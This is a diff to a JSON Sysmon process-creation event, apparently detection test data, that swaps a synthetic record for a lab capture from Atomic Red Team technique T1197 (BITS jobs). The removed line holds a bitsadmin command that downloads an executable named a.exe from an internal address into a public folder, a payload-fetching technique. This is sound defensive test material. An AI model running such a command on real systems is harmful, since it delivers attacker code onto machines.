@@ -1,8 +1,10 @@
 {
   "EventID": 1,
+  "UtcTime": "2026-11-15 12:37:16.056",
   "Image": "C:\\Windows\\System32\\bitsadmin.exe",
-  "CommandLine": "bitsadmin.exe /transfer evil /download /priority high http://10.0.0.5/a.exe C:\\Users\\Public\\a.exe",
+  "CommandLine": "bitsadmin.exe  /create AtomicBITS ",
   "ParentImage": "C:\\Windows\\System32\\cmd.exe",
-  "User": "VICTIM-PC\\analyst",
-  "_provenance": "synthetic"
+  "User": "WIN10-LAB\\analyst",
+  "_provenance": "real-capture",
+  "_atomic_source": "Atomic Red Team T1197 (captured via Sysmon)"
 }
